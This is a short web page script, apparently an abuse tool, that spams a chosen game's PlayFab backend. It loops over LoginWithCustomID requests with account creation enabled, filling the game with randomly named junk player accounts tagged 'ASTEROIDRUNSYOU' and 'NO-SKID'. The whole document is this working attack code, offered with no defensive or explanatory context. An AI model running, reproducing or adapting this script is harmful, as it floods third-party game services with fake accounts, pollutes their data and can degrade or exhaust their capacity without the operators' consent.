    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        async function spamPlayFab() {
            const titleId = document.getElementById('titleIdInput').value;
            const numUsers = parseInt(document.getElementById('numUsers').value, 10);
            const statusDiv = document.getElementById('status');

            if (!titleId) {
                statusDiv.textContent = 'please enter a title id first..!';
                return;
            }

            statusDiv.textContent = 'starting...';

            for (let i = 0; i < numUsers; i++) {
                const bomb = [...Array(5)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(Math.floor(Math.random() * 36))).join('');
                const request = {
                    CustomId: "ASTEROIDRUNSYOU-" + bomb,
                    CreateAccount: true,
                    DisplayName: "NO-SKID" + [...Array(5)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(Math.floor(Math.random() * 36))).join('')
                };
                
                try {
                    await axios.post(`https://${titleId}.playfabapi.com/Client/LoginWithCustomID`, request);
                    statusDiv.textContent = `made player ${i + 1}/${numUsers}.`;
                } catch (error) {
                    statusDiv.textContent = `couldn't make player ${i + 1}.`;
                }
            }

            statusDiv.textContent = 'done...!';
        }
    </script>
